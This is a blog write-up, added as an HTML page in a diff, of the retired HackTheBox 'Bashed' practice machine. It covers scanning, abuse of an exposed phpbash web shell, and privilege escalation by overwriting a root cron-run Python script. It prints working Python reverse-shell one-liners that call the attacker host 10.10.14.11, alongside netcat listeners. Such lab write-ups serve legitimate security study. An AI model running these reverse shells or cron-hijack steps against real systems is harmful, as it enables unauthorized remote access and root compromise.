@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>crazyeights225</title>
+   
+    <link rel="stylesheet" href="../assets/bulma.min.css">
+    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
+    <style>
+      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
+    </style>
+  </head>
+  <body>
+    <div id="app" class="mt-2">
+        <nav class="navbar container" role="navigation" aria-label="main navigation">
+            <div class="navbar-brand">
+              <a class="navbar-item" href="/">
+                <img src="../assets/logo.png">
+              </a>
+              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+              </a>
+            </div>
+            <div id="navbar" class="navbar-menu">
+              <div class="navbar-start">
+                    <a href="../index.html" class="navbar-item">Posts</a>
+                    <a href="../projects.html" class="navbar-item">Projects</a>
+              </div>
+            </div>
+          </nav>
+    </div>
+    <div class="hero-body mt-2" style="background-color: #285aff;">
+        <div class="container has-text-centered">
+            <h1 class="title" style="color: #f1f1f1;">
+               HackTheBox: Bashed
+            </h1>
+            <h2 class="subtitle" style="color: #f1f1f1;">
+                Jan 2, 2021
+            </h2>
+        </div>
+    </div>
+</section>
+<section class="container mt-2">
+<div class="content column is-10">
+    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
+        <ul>
+          <li><a href="../index.html">Posts</a></li>
+          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
+          <li class="is-active"><a href="#" aria-current="page">Bashed</a></li>
+        </ul>
+      </nav>
+<p>Practicing Retired HacktheBox Machines.</p>
+<h3>Scanning:</h3>
+<ul>
+<li>Find running services, using nmap, ping sweep didn't work switched to stealth scan:</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ nmap -PS 10.10.10.68
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-02 13:53 EST
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 2.09 seconds
+
+crazyeights@es-base:~$ sudo nmap -sS 10.10.10.68
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+</span></code></pre>
+<h3>Web:</h3>
+<p>Index Page:</p>
+<img src="images/22/s1.png">
+<p>Read the first post, and you will find that there is a web shell tool hosted somewhere on the server. If we find it we can try to get a reverse shell.</p>
+<img src="images/22/s2.png">
+<br><br>
+<h5>Enumeration:</h5>
+<pre><code><span>crazyeights@es-base:~$ dirb http://10.10.10.68
+
+---- Scanning URL: http://10.10.10.68/ ----
+==&gt; DIRECTORY: http://10.10.10.68/css/                                         
+==&gt; DIRECTORY: http://10.10.10.68/dev/                                         
+==&gt; DIRECTORY: http://10.10.10.68/fonts/                                       
+==&gt; DIRECTORY: http://10.10.10.68/images/                                      
++ http://10.10.10.68/index.html (CODE:200|SIZE:7743)                           
+==&gt; DIRECTORY: http://10.10.10.68/js/                                          
+==&gt; DIRECTORY: http://10.10.10.68/php/                                         
++ http://10.10.10.68/server-status (CODE:403|SIZE:299)                         
+==&gt; DIRECTORY: http://10.10.10.68/uploads/       
+</span></code></pre>
+<h3>PHP Bash:</h3>
+<ul>
+<li>
+<p>The phpbash web shell can be found in the folder dev:</p>
+<img src="images/22/s3.png">
+</li>
+<li>
+<p>Tried running several commands</p>
+<img src="images/22/s4.png">
+</li>
+<li>
+<p>There seemed to sometype of input sanitization that modified the commands before they were sent to the server (this might also not have been the case, other people didn't seem to have this problem when I looked after, I did a bunch of unecessary stuff to try to get it to work including creating a second webshell)</p>
+</li>
+<li>
+<p>Used insomnia to bypasss this</p>
+</li>
+<li>
+<p>Start the listener</p>
+</li>
+</ul>
+<pre><code><span>nc -lvp 1234
+</span></code></pre>
+<ul>
+<li>Request to phpbash.php with insomnia:</li>
+</ul>
+<pre><code><span>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.11&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+</span></code></pre>
+<img src="images/22/s5.png">
+<h3>User:</h3>
+<p>We get a shell:</p>
+<pre><code><span>crazyeights@es-base:~$ nc -lvp 1234
+listening on [any] 1234 ...
+
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre>
+<ul>
+<li>There are two users on the machine:</li>
+</ul>
+<pre><code><span>$ cd /home
+$ ls
+arrexel
+scriptmanager
+</span></code></pre>
+<h5>Get user flag:</h5>
+<pre><code><span>$ cd arrexel
+$ ls
+user.txt
+$ cat user.txt
+2c281_i_dont_want_to_get_in_trouble
+</span></code></pre>
+<h3>Root:</h3>
+<ul>
+<li>Find out if the user www-data can run any commands with elevated privileges:</li>
+</ul>
+<pre><code><span>sudo -l
+</span></code></pre>
+<ul>
+<li>www-data can run commands as scriptmanager without a password:</li>
+</ul>
+<pre><code><span>User www-data may run the following commands on bashed:
+    (scriptmanager : scriptmanager) NOPASSWD: ALL
+</span></code></pre>
+<ul>
+<li>Spawn a shell as the user scriptmanager:</li>
+</ul>
+<pre><code><span>$ sudo -u scriptmanager python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+scriptmanager@bashed:/var/www$ 
+</span></code></pre>
+<ul>
+<li>scriptmanager didnt seem to have an extra permissions</li>
+<li>Searching for files owned by scriptmanager:</li>
+</ul>
+<pre><code><span>scriptmanager@bashed:~$ find / -user scriptmanager 2&gt;/dev/null
+find / -user scriptmanager 2&gt;/dev/null
+/scripts
+/scripts/test.py
+/home/scriptmanager
+</span></code></pre>
+<ul>
+<li>
+<p>We find the folder scripts in the root dir. Its location suggests that it may be used for something...</p>
+</li>
+<li>
+<p>In the folder we find the file test.txt which is owned by root</p>
+</li>
+<li>
+<p>It was also recently modified suggesting there might be a cronjob for this folder:</p>
+</li>
+</ul>
+<pre><code><span>scriptmanager@bashed:/scripts$ ls -lia
+ls -lia
+total 16
+393492 drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
+     2 drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
+402847 -rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
+393805 -rw-r--r--  1 root          root            12 Jan  2 12:05 test.txt
+scriptmanager@bashed:/scripts
+</span></code></pre>
+<ul>
+<li>The file test.py must write to the file test.txt every couple minutes (?):</li>
+</ul>
+<pre><code><span>scriptmanager@bashed:/scripts$ cat test.txt
+cat test.txt
+testing 123!scriptmanager@bashed:/scripts$ 
+
+
+testing 123!scriptmanager@bashed:/scripts$ cat test.py
+cat test.py
+f = open(&quot;test.txt&quot;, &quot;w&quot;)
+f.write(&quot;testing 123!&quot;)
+f.close
+</span></code></pre>
+<ul>
+<li>Since the file test.txt is owned by root the file test.py must be run with root privileges</li>
+<li>Since we can modify the file test.py we can insert a reverse shell</li>
+</ul>
+<p>Start the listener:</p>
+<pre><code><span>nc -lvp 9999
+</span></code></pre>
+<p>Insert the reverse shell:</p>
+<pre><code><span>echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.11&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' &gt; test.py
+</span></code></pre>
+<h3>Root:</h3>
+<pre><code><span>crazyeights@es-base:~$ nc -lvp 9999
+listening on [any] 9999 ...
+
+ # id
+uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre>
+<h4>Root Flag:</h4>
+<pre><code><span> # cd /root
+ # ls
+root.txt
+ # cat root.txt
+cc4f_i_dont_want_to_get_in_trouble
+ # 
+</span></code></pre>
+<h6>Finding the cronjob:</h6>
+<pre><code><span> # crontab -l
+* * * * * cd /scripts; for f in *.py; do python &quot;$f&quot;; done
+ # 
+</span></code></pre>
+<p>FIN. 🥳</p>
+</div>
+</section>
+<footer class="footer">
+    <div class="container">
+        <div class="columns">
+        </div>
+    </div>
+</footer>
+</body>
+</html>
